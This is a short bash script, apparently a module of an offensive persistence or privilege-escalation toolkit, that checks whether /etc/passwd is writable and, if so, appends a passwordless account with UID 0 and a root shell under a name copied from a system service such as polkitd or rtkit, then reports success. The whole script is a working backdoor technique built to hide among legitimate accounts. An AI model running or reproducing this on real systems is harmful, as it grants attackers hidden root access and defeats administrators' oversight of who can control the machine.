#!/bin/bash
source "$(dirname "$0")/00_common.sh"
M="passwd"
info "Checking /etc/passwd..."
if [ -w /etc/passwd ]; then
    for n in "systemd-coredump" "polkitd" "rtkit"; do
        id "$n" &>/dev/null || { echo "$n::0:0::/root:/bin/bash" >> /etc/passwd && { result "$M" "success" "$n (no pass, uid 0)" ""; exit 0; }; }
    done
fi
result "$M" "fail" "Not writable" ""; exit 1
